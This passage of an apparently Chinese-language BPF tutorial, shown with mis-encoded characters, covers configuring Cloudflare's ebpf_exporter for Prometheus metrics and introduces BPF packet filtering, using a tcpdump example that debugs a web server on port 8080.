éœ€è¦åœ¨è®¡ç®—æœºä¸Šå·²ç»å®‰è£…BCCå’ŒGoçš„å·¥å…·é“¾ã€‚ æœ‰äº†è¿™äº›å…ˆå†³æ¡ä»¶åå¯ä»¥ä½¿ç”¨Goä¸‹è½½å’Œæ„å»ºäºŒè¿›åˆ¶æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get -u github.com/cloudflare/ebpf_exporter/...</span><br></pre></td></tr></table></figure><h5 id="ä»BPFå¯¼å‡ºæŒ‡æ ‡"><a href="#ä»BPFå¯¼å‡ºæŒ‡æ ‡" class="headerlink" title="ä»BPFå¯¼å‡ºæŒ‡æ ‡"></a>ä»BPFå¯¼å‡ºæŒ‡æ ‡</h5><p><code>eBPF Exporter</code>ä½¿ç”¨YAMLæ–‡ä»¶è¿›è¡Œé…ç½®ï¼Œä½ å¯ä»¥åœ¨å…¶ä¸­æŒ‡å®šè¦ä»ç³»ç»Ÿæ”¶é›†çš„æŒ‡æ ‡ã€ç”Ÿæˆè¿™äº›æŒ‡æ ‡çš„BPFç¨‹åºä»¥åŠå®ƒä»¬å¦‚ä½•è½¬æ¢ä¸ºPrometheusã€‚å½“ Prometheuså‘<code>eBPF Exporter</code>å‘é€è¯·æ±‚ä»¥æå–æŒ‡æ ‡æ—¶ï¼Œæ­¤å·¥å…·ä¼šå°†BPFç¨‹åºæ­£åœ¨æ”¶é›†çš„ä¿¡æ¯è½¬æ¢ä¸ºæŒ‡æ ‡å€¼ã€‚<code>eBPF Exporter</code>æ†ç»‘äº†è®¸å¤šç³»ç»Ÿæ”¶é›†éå¸¸æœ‰ç”¨çš„ä¿¡æ¯çš„ç¨‹åºï¼Œä¾‹å¦‚å‘¨æœŸæŒ‡ä»¤(IPC)å’ŒCPUç¼“å­˜å‘½ä¸­ç‡ã€‚</p><p><code>eBPF Exporter</code>çš„ç®€å•é…ç½®æ–‡ä»¶åŒ…æ‹¬ä¸‰ä¸ªä¸»è¦éƒ¨åˆ†ã€‚åœ¨ç¬¬ä¸€éƒ¨åˆ†ä¸­å®šä¹‰äº†å¸Œæœ›Prometheusä»ç³»ç»Ÿä¸­æå–çš„æŒ‡æ ‡ã€‚ åœ¨è¿™é‡Œå¯ä»¥å°†BPFæ˜ å°„ä¸­æ”¶é›†çš„æ•°æ®è½¬æ¢ä¸ºPrometheusç†è§£çš„æŒ‡æ ‡ã€‚ å¦‚ä¸‹ç¤ºä¾‹æ‰€ç¤ºï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">programs:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">timers</span></span><br><span class="line"><span class="attr">metrics:</span> </span><br><span class="line"><span class="attr">counters:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">timer_start_total</span></span><br><span class="line"><span class="attr">help:</span> <span class="string">Timers</span> <span class="string">fired</span> <span class="string">in</span> <span class="string">the</span> <span class="string">kernel</span> </span><br><span class="line"><span class="attr">table:</span> <span class="string">counts</span></span><br><span class="line"><span class="attr">labels:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">function</span> </span><br><span class="line"><span class="attr">size:</span> <span class="number">8</span></span><br><span class="line"><span class="attr">decoders:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">ksym</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªåä¸º<code>timer_start_total</code>çš„æŒ‡æ ‡ï¼Œå®ƒèšåˆäº†å†…æ ¸å¯åŠ¨å®šæ—¶å™¨çš„é¢‘ç‡ã€‚æˆ‘ä»¬è¿˜æŒ‡å®šæˆ‘ä»¬å¸Œæœ›ä»åä¸º<code>counts</code>çš„BPFæ˜ å°„ä¸­æ”¶é›†æ­¤ä¿¡æ¯ã€‚ æœ€åï¼Œæˆ‘ä»¬ä¸ºæ˜ å°„çš„é”®å®šä¹‰äº†ä¸€ä¸ªç¿»è¯‘å‡½æ•°ã€‚ è¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºæ˜ å°„é”®é€šå¸¸æ˜¯æŒ‡å‘ä¿¡æ¯çš„æŒ‡é’ˆï¼Œæˆ‘ä»¬å¸Œæœ›å‘Prometheuså‘é€å®é™…çš„å‡½æ•°åç§°ã€‚</p><p>æœ¬ä¾‹ä¸­çš„ç¬¬äºŒéƒ¨åˆ†æè¿°äº†æˆ‘ä»¬æƒ³è¦å°†BPFç¨‹åºé™„åŠ åˆ°çš„æ¢é’ˆã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¦è·Ÿè¸ªè®¡æ—¶å™¨å¼€å§‹è°ƒç”¨ï¼› æˆ‘ä»¬ä½¿ç”¨<code>tracepoint timer:timer_start</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tracepoints:</span><br><span class="line">  timer:timer_start: tracepoint__timer__timer_start</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å‘Šè¯‰<code>eBPF Exporter</code>ï¼Œæˆ‘ä»¬å¸Œæœ›å°†BPFå‡½æ•°<code>tracepoint__timer__timer_start</code>é™„åŠ åˆ°è¿™ä¸ªç‰¹å®šçš„è·Ÿè¸ªç‚¹ã€‚ æ¥ä¸‹æ¥è®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•å£°æ˜è¯¥å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code: |</span><br><span class="line">BPF_HASH(counts, u64);</span><br><span class="line"><span class="comment">// Generates function tracepoint__timer__timer_start </span></span><br><span class="line">TRACEPOINT_PROBE(timer, timer_start) &#123;</span><br><span class="line">  counts.increment((u64) args-&gt;function);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>eBPF Exporter</code>ä½¿ç”¨BCCç¼–è¯‘ç¨‹åºï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è®¿é—®å®ƒçš„æ‰€æœ‰å®å’Œå¸®åŠ©ç¨‹åºã€‚å‰é¢çš„ä»£ç ç‰‡æ®µä½¿ç”¨å®<code>TRACEPOINT_PROBE</code>ç”Ÿæˆæœ€ç»ˆå‡½æ•°ï¼Œæˆ‘ä»¬å°†é™„åŠ åˆ°åä¸º<code>tracepoint__timer__timer_start</code>çš„è·Ÿè¸ªç‚¹ã€‚</p><p>Cloudflareä½¿ç”¨<code>eBPF Exporter</code>æ¥ç›‘æ§å…¶æ‰€æœ‰æ•°æ®ä¸­å¿ƒçš„æŒ‡æ ‡ã€‚</p><h3 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><p>åœ¨æœ¬ç« ä¸­ï¼Œæˆ‘ä»¬è®¨è®ºäº†ä¸€äº›ç³»ç»Ÿåˆ†æå·¥å…·ã€‚å½“ä½ éœ€è¦è°ƒè¯•ç³»ç»Ÿä¸Šçš„ä»»ä½•å¼‚å¸¸æ—¶ï¼Œè¿™äº›å·¥å…·å¯ä»¥éšæ—¶ä½¿ç”¨ã€‚æ‰€æœ‰å·¥å…·éƒ½æŠ½è±¡äº†æˆ‘ä»¬åœ¨å‰å‡ ç« ä¸­çœ‹åˆ°çš„æ¦‚å¿µï¼Œä»¥å¸®åŠ©ä½ ä½¿ç”¨BPFå³ä¾¿ä½ çš„ç¯å¢ƒè¿˜æ²¡æœ‰å‡†å¤‡å¥½ã€‚è¿™æ˜¯BPFä¸å…¶ä»–ä¼—å¤šåˆ†æå·¥å…·ç›¸æ¯”çš„ä¼˜åŠ¿ä¹‹ä¸€ï¼›å› ä¸ºä»»ä½•ç°ä»£Linuxå†…æ ¸éƒ½åŒ…å«BPFè™šæ‹Ÿæœºï¼Œæ‰€ä»¥ä½ å¯ä»¥åœ¨å…¶ä¸Šæ„å»ºåˆ©ç”¨è¿™äº›å¼ºå¤§åŠŸèƒ½çš„æ–°å·¥å…·ã€‚</p><p>è¿˜æœ‰è®¸å¤šå…¶ä»–å·¥å…·å°†BPFç”¨äºç±»ä¼¼ç›®çš„ï¼Œä¾‹å¦‚<code>Cilium</code>å’Œ<code>Sysdig</code>ï¼Œæˆ‘ä»¬é¼“åŠ±ä½ å»å°è¯•ä½¿ç”¨å®ƒä»¬ã€‚</p><p>åœ¨æ¥ä¸‹æ¥çš„ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æ·±å…¥æ¢è®¨å®ƒçš„ç½‘ç»œåŠŸèƒ½ã€‚æˆ‘ä»¬å°†å±•ç¤ºå¦‚ä½•åˆ†æä»»ä½•ç½‘ç»œä¸­çš„æµé‡ä»¥åŠå¦‚ä½•ä½¿ç”¨BPFæ¥æ§åˆ¶ç½‘ç»œä¸­çš„æ¶ˆæ¯ã€‚</p><h2 id="ç¬¬å…­ç« èŠ‚"><a href="#ç¬¬å…­ç« èŠ‚" class="headerlink" title="ç¬¬å…­ç« èŠ‚"></a>ç¬¬å…­ç« èŠ‚</h2><h3 id="Linuxç½‘ç»œå’ŒBPF"><a href="#Linuxç½‘ç»œå’ŒBPF" class="headerlink" title="Linuxç½‘ç»œå’ŒBPF"></a>Linuxç½‘ç»œå’ŒBPF</h3><p>ä»ç½‘ç»œçš„è§’åº¦æ¥çœ‹ï¼Œæˆ‘ä»¬å°†BPFç¨‹åºç”¨äºä¸¤ä¸ªç”¨é€”ï¼šæ•°æ®åŒ…æ•è·å’Œè¿‡æ»¤ã€‚</p><p>è¿™æ„å‘³ç€ç”¨æˆ·ç©ºé—´ç¨‹åºå¯ä»¥å°†è¿‡æ»¤å™¨é™„åŠ åˆ°ä»»ä½•å¥—æ¥å­—å¹¶æå–æœ‰å…³æµç»å®ƒçš„æ•°æ®åŒ…çš„ä¿¡æ¯ï¼Œå¹¶å…è®¸/ç¦æ­¢/é‡å®šå‘æŸäº›ç±»å‹çš„æ•°æ®åŒ…ï¼Œå› ä¸ºå®ƒä»¬åœ¨è¯¥çº§åˆ«å¯ä»¥çœ‹åˆ°ã€‚</p><p>æœ¬ç« çš„ç›®çš„æ˜¯è§£é‡ŠBPFç¨‹åºåœ¨Linuxå†…æ ¸ç½‘ç»œå †æ ˆä¸­ç½‘ç»œæ•°æ®è·¯å¾„çš„ä¸åŒé˜¶æ®µå¦‚ä½•ä¸<code>Socket Buffer</code>ç»“æ„è¿›è¡Œäº¤äº’ã€‚ æˆ‘ä»¬å°†ç¡®å®šä¸¤ç§ç±»å‹çš„ç¨‹åºä½œä¸ºå¸¸è§ç”¨ä¾‹</p><ul><li>ä¸å¥—æ¥å­—ç›¸å…³çš„ç¨‹åºç±»å‹</li><li>åŸºäºBPFçš„æµé‡æ§åˆ¶åˆ†ç±»å™¨ç¼–å†™çš„ç¨‹åº</li></ul><p><code>Socket Buffer</code>ç»“æ„ï¼Œä¹Ÿç§°ä¸ºSKBæˆ–<code>sk_buff</code>ï¼Œæ˜¯å†…æ ¸ä¸­ä¸ºæ¯ä¸ªå‘é€æˆ–æ¥æ”¶çš„æ•°æ®åŒ…åˆ›å»ºå’Œä½¿ç”¨çš„ç»“æ„ã€‚é€šè¿‡è¯»å–SKBå¯ä»¥ä¼ é€’æˆ–ä¸¢å¼ƒæ•°æ®åŒ…å¹¶å¡«å……BPFæ˜ å°„ä»¥åˆ›å»ºæœ‰å…³å½“å‰æµé‡çš„ç»Ÿè®¡ä¿¡æ¯å’Œæµé‡æŒ‡æ ‡ã€‚</p><p>æ­¤å¤–ï¼Œä¸€äº›BPFç¨‹åºå…è®¸ä½ æ“ä½œSKBï¼Œå¹¶é€šè¿‡æ‰©å±•è½¬æ¢æœ€ç»ˆæ•°æ®åŒ…ï¼Œä»¥é‡å®šå‘æˆ–æ”¹å˜å®ƒä»¬çš„åŸºæœ¬ç»“æ„ã€‚ä¾‹å¦‚ï¼Œåœ¨ä»…ä½¿ç”¨IPv6çš„ç³»ç»Ÿä¸Šå¯ä»¥ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œå°†æ‰€æœ‰æ”¶åˆ°çš„æ•°æ®åŒ…ä»IPv4è½¬æ¢ä¸º IPv6ï¼Œè¿™å¯ä»¥é€šè¿‡ä¿®æ”¹æ•°æ®åŒ…çš„SKBæ¥å®Œæˆã€‚</p><p>ç†è§£ç½‘ç»œä¸­çš„BPFå’ŒeBPFçš„å…³é”®æ˜¯éœ€è¦äº†è§£æˆ‘ä»¬å¯ä»¥ç¼–å†™çš„ä¸åŒç±»å‹çš„ç¨‹åºä¹‹é—´çš„å·®å¼‚ï¼Œä»¥åŠä¸åŒçš„ç¨‹åºå¦‚ä½•å¯¼è‡´ç›¸åŒçš„ç»“æœï¼›åœ¨ä¸‹ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»åœ¨å¥—æ¥å­—çº§åˆ«è¿›è¡Œè¿‡æ»¤çš„ä¸¤ç§æ–¹æ³•ï¼šä½¿ç”¨ç»å…¸çš„BPFè¿‡æ»¤å™¨ï¼Œä»¥åŠä½¿ç”¨é™„åŠ åˆ°å¥—æ¥å­—çš„eBPFç¨‹åºã€‚</p><h3 id="BPFå’ŒåŒ…è¿‡æ»¤"><a href="#BPFå’ŒåŒ…è¿‡æ»¤" class="headerlink" title="BPFå’ŒåŒ…è¿‡æ»¤"></a>BPFå’ŒåŒ…è¿‡æ»¤</h3><p>å¦‚å‰æ‰€è¿°ï¼ŒBPFè¿‡æ»¤å™¨å’ŒeBPFç¨‹åºæ˜¯BPFç¨‹åºåœ¨ç½‘ç»œç¯å¢ƒä¸­çš„ä¸»è¦ç”¨ä¾‹ã€‚ç„¶è€Œæœ€å¼€å§‹BPFç¨‹åºæ˜¯åŒ…è¿‡æ»¤çš„åŒä¹‰è¯ã€‚</p><p>åŒ…è¿‡æ»¤ä»ç„¶æ˜¯æœ€é‡è¦çš„ç”¨ä¾‹ä¹‹ä¸€ï¼Œå¹¶ä¸”å·²ç»ä»ç»å…¸çš„BPF (cBPF)æ‰©å±•åˆ°<code>Linux 3.19</code>ä¸­çš„eBPFï¼Œå¹¶åœ¨è¿‡æ»¤ç¨‹åºç±»å‹<code>BPF_PROG_TYPE_SOCKET_FILTER</code>ä¸­æ·»åŠ äº†ä¸æ˜ å°„ç›¸å…³çš„åŠŸèƒ½ã€‚</p><p>è¿‡æ»¤å™¨ä¸»è¦å¯ç”¨äºä¸‰ä¸ªé«˜çº§åœºæ™¯ï¼š</p><ul><li>å®æ—¶æµé‡ä¸¢å¼ƒï¼ˆä¾‹å¦‚ï¼Œä»…å…è®¸ç”¨æˆ·æ•°æ®æŠ¥åè®®UDPæµé‡ï¼Œä¸¢å¼ƒå…¶ä»–ä»»ä½•å†…å®¹ï¼‰</li><li>å®æ—¶è§‚å¯Ÿæµå…¥ç³»ç»Ÿçš„ä¸€ç»„è¿‡æ»¤æ•°æ®åŒ…</li><li>ä½¿ç”¨<code>pcap</code>æ ¼å¼å¯¹å®æ—¶ç³»ç»Ÿä¸Šæ•è·çš„ç½‘ç»œæµé‡è¿›è¡Œå›é¡¾åˆ†æ</li></ul><p>æœ¯è¯­<code>pcap</code>æ¥è‡ªä¸¤ä¸ªè¯çš„ç»“åˆï¼šæ•°æ®åŒ…(packet)å’Œæ•è·(capture)ã€‚<code>pcap</code>æ ¼å¼åœ¨æ•°æ®åŒ…æ•è·åº“ <code>libpcap</code>çš„åº“ä¸­å®ç°ï¼Œæ˜¯ç”¨äºæ•°æ®åŒ…æ•è·çš„ç‰¹å®šåŸŸAPIã€‚ å½“ä½ å¸Œæœ›åœ¨å®æ—¶ç³»ç»Ÿä¸Šæ•è·çš„ä¸€ç»„æ•°æ®åŒ…èƒ½å¤Ÿç›´æ¥ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œæ–¹ä¾¿åç»­ä½¿ç”¨<code>pcap</code>æ ¼å¼å¯¼å‡ºçš„æ•°æ®åŒ…æµçš„å·¥å…·è¿›è¡Œåˆ†ææ—¶ï¼Œè¿™ç§æ ¼å¼åœ¨è°ƒè¯•åœºæ™¯ä¸­å¾ˆæœ‰ç”¨ã€‚</p><p>åœ¨æ¥ä¸‹æ¥çš„éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬å°†å±•ç¤ºä¸¤ç§ä¸åŒçš„æ–¹å¼æ¥åº”ç”¨BPFç¨‹åºçš„åŒ…è¿‡æ»¤ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å±•ç¤ºäº†åƒ<code>tcpdump</code>è¿™æ ·çš„å¸¸è§ä¸”å¹¿æ³›ä½¿ç”¨çš„å·¥å…·å¦‚ä½•å……å½“ç”¨ä½œè¿‡æ»¤å™¨çš„BPFç¨‹åºçš„æ›´é«˜çº§çš„æ¥å£ã€‚ç„¶åæˆ‘ä»¬ä½¿ç”¨<code>BPF_PROG_TYPE_SOCKET_FILTER</code>BPFç¨‹åºç±»å‹ç¼–å†™å¹¶åŠ è½½æˆ‘ä»¬è‡ªå·±çš„ç¨‹åºã€‚</p><h4 id="tcpdumpå’ŒBPFè¡¨è¾¾å¼"><a href="#tcpdumpå’ŒBPFè¡¨è¾¾å¼" class="headerlink" title="tcpdumpå’ŒBPFè¡¨è¾¾å¼"></a>tcpdumpå’ŒBPFè¡¨è¾¾å¼</h4><p>è¯´åˆ°å®æ—¶æµé‡åˆ†æå’Œè§‚å¯Ÿï¼Œæ¯ä¸ªäººéƒ½çŸ¥é“çš„å‘½ä»¤è¡Œå·¥å…·ä¹‹ä¸€å°±æ˜¯<code>tcpdump</code>ã€‚ æœ¬è´¨ä¸Šæ˜¯<code>libpcap</code>çš„å‰ç«¯ï¼Œå®ƒå…è®¸ç”¨æˆ·å®šä¹‰é«˜çº§è¿‡æ»¤è¡¨è¾¾å¼ã€‚<code>tcpdump</code>æ‰€åšçš„æ˜¯ä»ä½ é€‰æ‹©çš„ç½‘ç»œæ¥å£ï¼ˆæˆ–ä»»ä½•æ¥å£ï¼‰è¯»å–æ•°æ®åŒ…ï¼Œç„¶åå°†æ¥æ”¶åˆ°çš„æ•°æ®åŒ…çš„å†…å®¹å†™å…¥æ ‡å‡†è¾“å‡ºæˆ–æ–‡ä»¶ã€‚ç„¶åå¯ä»¥ä½¿ç”¨<code>pcap</code>è¿‡æ»¤å™¨è¯­æ³•è¿‡æ»¤æ•°æ®åŒ…æµã€‚<code>pcap</code>è¿‡æ»¤å™¨è¯­æ³•æ˜¯ä¸€ç§DSLï¼Œä½¿ç”¨ä¸€ç»„åŸè¯­ç»„æˆçš„é«˜çº§è¡¨è¾¾å¼é›†è¿‡æ»¤æ•°æ®åŒ…ï¼Œè¿™äº›åŸè¯­é€šå¸¸æ¯”BPFæ±‡ç¼–æ›´å®¹æ˜“è®°ä½ã€‚è§£é‡Š<code>pcap</code>è¿‡æ»¤å™¨è¯­æ³•ä¸­æ‰€æœ‰å¯èƒ½çš„åŸè¯­å’Œè¡¨è¾¾å¼è¶…å‡ºäº†æœ¬ç« çš„èŒƒå›´ï¼Œå…·ä½“å¯ä»¥ä½¿ç”¨<code>man 7 pcap-filter</code>æŸ¥çœ‹ã€‚</p><p>åœºæ™¯æ˜¯æˆ‘ä»¬åœ¨ä¸€ä¸ªLinuxæœºå™¨ä¸­ï¼Œå®ƒåœ¨ç«¯å£<code>8080</code>ä¸Šå…¬å¼€äº†ä¸€ä¸ªWebæœåŠ¡å™¨ï¼›è¿™ä¸ªWebæœåŠ¡å™¨æ²¡æœ‰è®°å½•å®ƒæ¥æ”¶åˆ°çš„è¯·æ±‚ï¼Œæˆ‘ä»¬æƒ³çŸ¥é“å®ƒæ˜¯å¦æ­£åœ¨æ¥æ”¶ä»»ä½•è¯·æ±‚ä»¥åŠè¿™äº›è¯·æ±‚æ˜¯å¦‚ä½•æµå…¥çš„ï¼Œå› ä¸ºæ‰€æœåŠ¡åº”ç”¨ç¨‹åºçš„å®¢æˆ·æŠ±æ€¨åœ¨æµè§ˆæ—¶æ— æ³•è·å¾—ä»»ä½•å“åº”äº§å“é¡µé¢ã€‚åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œæˆ‘ä»¬åªçŸ¥é“å®¢æˆ·æ­£åœ¨ä½¿ç”¨ç”±è¯¥WebæœåŠ¡å™¨æä¾›çš„Webåº”ç”¨ç¨‹åºè¿æ¥åˆ°æˆ‘ä»¬çš„äº§å“é¡µé¢ï¼Œå¹¶ä¸”æ€»æ˜¯å‘ç”Ÿè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬ä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ï¼Œå› ä¸ºæœ€ç»ˆç”¨æˆ·é€šå¸¸ä¸ä¼šè°ƒè¯•æœåŠ¡ï¼Œä¸å¹¸çš„æ˜¯æˆ‘ä»¬æ²¡æœ‰åœ¨è¿™ä¸ªç³»ç»Ÿä¸­éƒ¨ç½²ä»»ä½•æ—¥å¿—è®°å½•æˆ–é”™è¯¯æŠ¥å‘Šç­–ç•¥ï¼Œå› æ­¤æˆ‘ä»¬åœ¨è°ƒæŸ¥é—®é¢˜æ—¶å®Œå…¨æ˜¯ç›²ç›®çš„ã€‚å¹¸è¿çš„æ˜¯ï¼Œæœ‰ä¸€ä¸ªå·¥å…·å¯ä»¥å¸®åŠ©æˆ‘ä»¬ï¼å®ƒæ˜¯<code>tcpdump</code>ï¼Œå¯ä»¥å‘Šè¯‰å®ƒåªè¿‡æ»¤åœ¨æˆ‘ä»¬ç³»ç»Ÿä¸­æµåŠ¨çš„IPv4æ•°æ®åŒ…ï¼Œè¿™äº›æ•°æ®åŒ…åœ¨ç«¯å£8080ä¸Šä½¿ç”¨ä¼ è¾“æ§åˆ¶åè®® (TCP)ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å°†èƒ½å¤Ÿåˆ†æWebæœåŠ¡å™¨çš„æµé‡ã€‚</p><p>ä»¥ä¸‹æ˜¯ä½¿ç”¨<code>tcpdump</code>è¿›è¡Œè¿‡æ»¤çš„å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# tcpdump -n 'ip and tcp port 8080'</span><br></pre></td></tr></table></figure><p>è®©æˆ‘ä»¬çœ‹çœ‹è¿™ä¸ªå‘½ä»¤ä¸­å‘ç”Ÿäº†ä»€ä¹ˆï¼š</p><ul><li><code>-n</code> æ˜¯ä¸ºäº†å‘Šè¯‰<code>tcpdump</code>ä¸è¦å°†åœ°å€è½¬æ¢ä¸ºå„è‡ªçš„åç§°ï¼Œæˆ‘ä»¬æƒ³æŸ¥çœ‹æºåœ°å€å’Œç›®æ ‡åœ°å€ã€‚</li><li><code>ip and tcp port 8080</code>æ˜¯<code>tcpdump</code>ç”¨äºè¿‡æ»¤æ•°æ®åŒ…çš„<code>pcap</code>è¿‡æ»¤å™¨è¡¨è¾¾å¼ã€‚ipè¡¨ç¤º <code>IPv4</code>ï¼Œå®ƒæ˜¯ä¸€ä¸ªè¿è¯ï¼Œè¡¨ç¤ºä¸€ä¸ªæ›´å¤æ‚çš„è¿‡æ»¤å™¨ï¼Œä»¥å…è®¸æ·»åŠ æ›´å¤šè¡¨è¾¾å¼æ¥åŒ¹é…ï¼Œç„¶åæˆ‘ä»¬æŒ‡å®šæˆ‘ä»¬åªå¯¹æ¥è‡ªtcpç«¯å£8080æˆ–åˆ°è¾¾ç«¯å£8080çš„tcpæ•°æ®åŒ…æ„Ÿå…´è¶£ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ›´å¥½çš„è¿‡æ»¤å™¨åº”è¯¥æ˜¯<code>tcp dst port 8080</code>ï¼Œå› ä¸ºæˆ‘ä»¬åªå¯¹ç›®æ ‡ç«¯å£ä¸º<code>8080</code>çš„æ•°æ®åŒ…æ„Ÿå…´è¶£ï¼Œè€Œä¸æ˜¯æ¥è‡ªå®ƒçš„æ•°æ®åŒ…ã€‚</li></ul><p>å…¶è¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode</span><br><span class="line">    listening on wlp4s0, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">    12:04:29.593703 IP 192.168.1.249.44206 &gt; 192.168.1.63.8080: Flags [P.],</span><br><span class="line">       seq 1:325, ack 1, win 343,</span><br><span class="line">       options [nop,nop,TS val 25580829 ecr 595195678],</span><br><span class="line">       length 324: HTTP: GET / HTTP/1.1</span><br><span class="line">    12:04:29.596073 IP 192.168.1.63.8080 &gt; 192.168.1.249.44206: Flags [.],</span><br><span class="line">       seq 1:1449, ack 325, win 507,</span><br><span class="line">       options [nop,nop,TS val 595195731 ecr 25580829],</span><br><span class="line">       length 1448: HTTP: HTTP/1.1 200 OK</span><br><span class="line">    12:04:29.596139 IP 192.168.1.63.8080 &gt; 192.168.1.249.44206: Flags [P.],</span><br><span class="line">       seq 1449:2390, ack 325, win 507,</span><br><span class="line">       options [nop,nop,TS val 595195731 ecr 25580829],</span><br><span class="line">       length 941: HTTP</span><br><span class="line">    12:04:46.242924 IP 192.168.1.249.44206 &gt; 192.168.1.63.8080: Flags [P.],</span><br><span class="line">       seq 660:996, ack 4779, win 388,</span><br><span class="line">       options [nop,nop,TS val 25584934 ecr 595204802],</span><br><span class="line">       length 336: HTTP: GET /api/products HTTP/1.1</span><br><span class="line">    12:04:46.243594 IP 192.168.1.63.8080 &gt; 192.168.1.249.44206: Flags [P.],</span><br><span class="line">       seq 4779:4873, ack 996, win 503,</span><br><span class="line">       options [nop,nop,TS val 595212378 ecr 25584934],</span><br><span class="line">       length 94: HTTP: HTTP/1.1 500 Internal Server Error</span><br><span class="line">    12:04:46.329245 IP 192.168.1.249.44234 &gt; 192.168.1.63.8080: Flags [P.],</span><br><span class="line">       seq 471:706, ack 4779, win 388,</span><br><span class="line">       options [nop,nop,TS val 25585013 ecr 595205622],</span><br><span class="line">       length 235: HTTP: GET /favicon.ico HTTP/1.1</span><br><span class="line">    12:04:46.331659 IP 192.168.1.63.8080 &gt; 192.168.1.249.44234: Flags [.],</span><br><span class="line">       seq 4779:6227, ack 706, win 506,</span><br><span class="line">       options [nop,nop,TS val 595212466 ecr 25585013],</span><br><span class="line">       length 1448: HTTP: HTTP/1.1 200 OK</span><br><span class="line">    12:04:46.331739 IP 192.168.1.63.8080 &gt; 192.168.1.249.44234: Flags [P.],</span><br><span class="line">       seq 6227:7168, ack 706, win 506,</span><br><span class="line">       options [nop,nop,TS val 595212466 ecr 25585013],</span><br><span class="line">       length 941: HTTP</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æœ‰ä¸€å †è¯·æ±‚è¿›å±•é¡ºåˆ©ï¼Œè¿”å›200 OKçŠ¶æ€ä»£ç ï¼Œä½†åœ¨<code>/api/products</code>ç«¯ç‚¹ä¸Šè¿˜æœ‰ä¸€ä¸ªå¸¦æœ‰500å†…éƒ¨æœåŠ¡å™¨é”™è¯¯ä»£ç çš„è¯·æ±‚ã€‚è¡¨ç¤ºæˆ‘ä»¬åœ¨åˆ—å‡ºäº§å“æ—¶æœåŠ¡å™¨é‡åˆ°é—®é¢˜ï¼</p><p>æ­¤æ—¶ï¼Œä½ å¯èƒ½ä¼šé—®ï¼Œå¦‚æœBPFç¨‹åºæœ‰è‡ªå·±çš„è¯­æ³•ï¼Œæ‰€æœ‰è¿™äº›<code>pcap</code>è¿‡æ»¤å†…å®¹å’Œ<code>tcpdump</code>æœ‰ä»€ä¹ˆå…³ç³»ï¼ŸLinuxä¸Šçš„<code>Pcap</code>è¿‡æ»¤å™¨è¢«ç¼–è¯‘ä¸ºBPFç¨‹åºï¼è€Œä¸”å› ä¸º<code>tcpdump</code>ä½¿ç”¨<code>pcap</code>è¿‡æ»¤å™¨è¿›è¡Œè¿‡æ»¤ï¼Œè¿™æ„å‘³ç€æ¯æ¬¡ä½¿ç”¨è¿‡æ»¤å™¨æ‰§è¡Œ<code>tcpdump</code>æ—¶ï¼Œå®é™…ä¸Šæ˜¯åœ¨ç¼–è¯‘å’ŒåŠ 